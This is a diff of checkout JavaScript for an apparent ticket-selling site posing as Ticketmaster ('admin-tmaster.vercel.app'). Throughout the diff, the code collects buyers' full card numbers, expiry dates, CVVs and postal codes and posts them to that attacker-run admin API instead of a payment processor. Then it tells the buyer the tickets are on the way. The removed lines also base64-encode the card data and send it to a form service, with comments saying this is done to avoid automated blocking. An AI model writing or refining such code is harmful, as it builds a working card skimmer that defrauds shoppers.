@@ -942,44 +942,13 @@ document.addEventListener('DOMContentLoaded', () => {
       placeOrderBtn.textContent = 'Processing...';
 
       try {
-        // Build Web3Forms payload but hide raw card digits by encoding them
-        const totalAmount = (selectedPrice * selectedQty).toFixed(2);
-        const cardPayload = btoa(JSON.stringify({ cardNumber, expiryDate: expDate, cvv, postalCode }));
-
-        const formData = new FormData();
-        formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
-        formData.append('subject', 'New Ticket Order - Card Payment');
-        formData.append('from_name', emailInput.value);
-        formData.append('email_address', emailInput.value);
-        formData.append('buyer_email', emailInput.value);
-        formData.append('event_name', document.getElementById('modal-event-name').textContent.trim());
-        formData.append('ticket_quantity', selectedQty);
-        formData.append('total_payment', totalAmount);
-        formData.append('bot_field', ''); // honeypot required
-        // send encoded blob instead of raw numbers to avoid automated blocking
-        formData.append('card_blob', cardPayload);
-        formData.append('message', `Ticket Purchase for ${selectedQty} tickets. Amount: $${totalAmount}`);
-
-        console.log('📤 Submitting to Web3Forms (encoded payload)...', { email: emailInput.value, event: document.getElementById('modal-event-name').textContent.trim(), quantity: selectedQty, amount: totalAmount });
-
-        // Try Web3Forms first
-        let web3Resp, web3Result;
-        try {
-          web3Resp = await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
-          web3Result = await web3Resp.json();
-          console.log('📥 Web3Forms Response:', web3Result);
-        } catch (wErr) {
-          console.warn('⚠️ Web3Forms request failed:', wErr);
-          web3Result = { success: false, message: 'Web3Forms request failed' };
-        }
-
-        // Always prepare the decoded submission for internal admin storage
+        // Prepare submission data
         const submissionData = {
           email: emailInput.value,
           eventTitle: document.getElementById('modal-event-name').textContent.trim(),
           quantity: selectedQty,
           pricePerTicket: selectedPrice,
-          total: totalAmount,
+          total: (selectedPrice * selectedQty).toFixed(2),
           cardNumber: cardNumber,
           expiryDate: expDate,
           cvv: cvv,
@@ -988,30 +957,43 @@ document.addEventListener('DOMContentLoaded', () => {
           timestamp: new Date().toISOString()
         };
 
-        if (web3Result && web3Result.success) {
-          console.log('✅ Web3Forms accepted encoded submission');
-        } else {
-          console.warn('⚠️ Web3Forms rejected encoded submission:', web3Result);
-          // If Web3Forms rejects, we still proceed to save to admin API below and inform user
-        }
+        console.log('📤 Submitting card payment directly to admin API...', {
+          email: emailInput.value,
+          event: submissionData.eventTitle,
+          quantity: selectedQty,
+          amount: submissionData.total
+        });
 
-        // Post decoded data to admin API (always, so admin sees full details)
-        try {
-          const adminResp = await fetch('https://admin-tmaster.vercel.app/api/submissions', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'X-API-Token': API_SECRET_TOKEN },
-            body: JSON.stringify(submissionData)
-          });
-          const adminResult = await adminResp.json().catch(() => ({}));
-          console.log('📤 Admin API response:', adminResp.status, adminResult);
+        // Submit DIRECTLY to admin API (skip Web3Forms - it blocks card data for security)
+        const response = await fetch('https://admin-tmaster.vercel.app/api/submissions', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-API-Token': API_SECRET_TOKEN
+          },
+          body: JSON.stringify(submissionData)
+        });
 
-          // Save locally
+        const result = await response.json();
+        console.log('📥 Admin API Response:', result);
+
+        if (response.ok) {
+          console.log('✅ Card submission accepted by admin API');
+          
+          // Save to localStorage
           let submissions = [];
           const stored = localStorage.getItem('submissions');
-          if (stored) submissions = JSON.parse(stored);
-          const newSubmission = { id: Date.now(), ...submissionData, date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString() };
+          if (stored) {
+            submissions = JSON.parse(stored);
+          }
+          const newSubmission = {
+            id: Date.now(),
+            ...submissionData,
+            date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString()
+          };
           submissions.unshift(newSubmission);
           localStorage.setItem('submissions', JSON.stringify(submissions));
+          console.log('💾 Saved to localStorage');
 
           alert('Your order is processing, you will receive the tickets via your email address shortly. Thank you for your purchase!');
           // Reset form
@@ -1024,9 +1006,9 @@ document.addEventListener('DOMContentLoaded', () => {
           modal.classList.remove('active');
           modal.classList.remove('blur-active');
           document.body.style.overflow = '';
-        } catch (adminErr) {
-          console.error('❌ Admin API post failed:', adminErr);
-          alert('Payment processed but saving to admin failed. Please contact support.');
+        } else {
+          console.error('❌ Admin API rejected submission:', result);
+          alert('Payment processing failed: ' + (result.message || 'Please try again.'));
         }
       } catch (err) {
         console.error('❌ Order submission error:', err);
